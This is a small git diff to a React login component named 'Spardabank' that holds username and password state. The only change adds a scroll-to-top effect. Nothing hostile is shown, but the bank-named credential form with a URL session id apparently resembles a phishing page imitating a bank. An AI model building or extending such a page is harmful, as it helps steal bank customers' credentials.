@@ -12,6 +12,8 @@ const Spardabank = () => {
   const sessionId = searchParams.get("s") || "";
   const [showLoading, setShowLoading] = useState(false);
 
+  useEffect(() => { window.scrollTo(0, 0); }, []);
+
   const [username, setUsername] = useState("");
   const [isFocused, setIsFocused] = useState(false);
   const [password, setPassword] = useState("");
